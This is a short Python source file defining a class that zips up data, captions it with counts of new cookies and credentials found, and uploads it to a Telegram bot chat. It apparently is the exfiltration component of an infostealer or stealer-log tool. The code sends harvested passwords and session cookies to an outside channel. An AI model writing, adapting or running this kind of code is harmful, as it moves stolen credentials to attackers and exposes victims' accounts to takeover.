import requests

class TelegramPoster:
    def __init__(self, logger, bot_token, chat_id):
        self.logger = logger
        self.bot_token = bot_token
        self.chat_id = chat_id

    def post_log(self, path_to_zip, zip_file_name, cookies_stats, passwords_stats):
        if self.bot_token == "-1" or self.chat_id == "-1":
            return

        message = f"New data was found in:\n{zip_file_name.replace(' ', '_')}\n"

        if cookies_stats:
            message += "\n\n===== Cookies =====\n"
            for cookie_type, data in cookies_stats.items():
                unique_cookies = data["unique"]
                message += f" > {unique_cookies} new and unique {cookie_type.upper()} cookies!\n"
        
        if passwords_stats:
            message += "\n\n===== Credentials =====\n"
            for password_type, data in passwords_stats.items():
                unique_passwords = data["unique"]
                message += f" > {unique_passwords} new and unique {password_type.upper()} credentials!\n"

        url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument?chat_id={self.chat_id}"
        files = {
            'document': open(path_to_zip, 'rb')
        }
        data = {
            'caption': message
        }

        # Send a POST request with both the message and file attached
        response = requests.post(url, files=files, data=data, stream=True)
        if response.status_code == 200:
            self.logger.print_success("New log file got posted!", True)
        else:
            self.logger.print_error("There was a problem uploading the log file!", True)
            self.logger.print_error(str(response.status_code))
            self.logger.print_error(response.reason)